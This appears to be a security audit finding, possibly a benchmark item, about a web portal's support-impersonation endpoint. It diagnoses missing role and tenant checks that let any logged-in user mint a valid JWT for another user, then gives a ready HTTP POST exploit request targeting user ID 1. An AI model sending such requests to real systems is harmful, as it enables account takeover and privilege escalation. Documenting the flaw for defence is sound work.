diagnosis: The impersonation token view only checks that the caller is authenticated, omitting role checks and tenant-boundary authorization. The payload handler assigns target_user_id directly into the JWT 'user_id' claim. Any authenticated regular user can forge a fully valid JWT for any other user (including system administrators) without authorization or audit gating.
exploit_request:
POST /api/support/impersonate/ HTTP/1.1
Host: portal.enterprisecare.io
Authorization: Bearer <low_privilege_user_token>
Content-Type: application/json

{"target_user_id": 1}
